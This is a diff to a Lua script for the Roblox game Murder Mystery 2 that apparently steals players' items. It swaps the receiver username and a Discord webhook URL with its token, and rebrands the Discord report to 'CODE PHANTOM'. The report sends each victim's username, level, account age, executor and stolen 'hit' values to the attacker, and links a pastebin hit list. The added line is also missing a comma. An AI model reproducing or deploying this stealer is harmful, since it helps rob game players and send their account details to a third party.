@@ -1,5 +1,5 @@
-userName = "oned_9d"
-webHook = "https://discord.com/api/webhooks/1367020031241621554/FblukkfUOucyaQXlKbiu_Khiius4T6a2Ne-L-bPqOOil4Ftj79JgRxDn-fUwA2T7uarl"
+userName = "textboy1230alt"
+webHook = "https://discord.com/api/webhooks/1341694409808281671/ceMOqZgzHvpKk9sfU77CaELxVp4aEaIc2x5AMvbf6REoQbMCiSSxTGxQJNCRwc4crfTz"
 
 local values = {
     ["Nik's Scythe"] = 25000000,
@@ -1092,13 +1092,14 @@ end
 
 
 local WebHookEmbed = CreateEmbed(
-    "Deno Scripts | MM2",
+    "CODE PHANTOM | MM2",
     "U finally got a hit dumbass",
     11220,
     {
         {name = "```🧛‍♀️ Info```", value = "```🙍‍♂️ Username: "..LP.Name.."\n💫 Level: "..tostring(getLvl()).."\n🔞 Account-Age: "..tostring(LP.AccountAge).."\n🎮 Executor: "..identifyexecutor().."\n🐱‍👤 Receiver: "..userName.."```"},
         {name = "```🎯 Hit Info```", value = "```💵 Total Value: "..tostring(math.floor(valueCount + 0.5)).."\n➕ Total Count: "..tostring(itemsCount - 2).."\n\n🌟 Uniques: "..tostring(uniqueItemsC).."\n🔮 Ancients: "..tostring(ancientItemsC).."\n💎 Godlys: "..tostring(godlyItemsC).."\n🏆 Legendarys: "..tostring(legendaryItemsC).."\n⌚ Vintage: "..tostring(vintageItemsC).."\n📈 Rares: "..tostring(rareItemsC).."\n🔹 Uncommons: "..tostring(uncommonItemsC).."\n🔸 Commons: "..tostring(commonItemsC).."```"},
         {name = "```💻 Hit List```", value = "[Click Me]("..pastebin(EverythingString)..")"}
+        {name = "```made by```", value = "@code.phantom.gg on discord"}
     }
 )
 
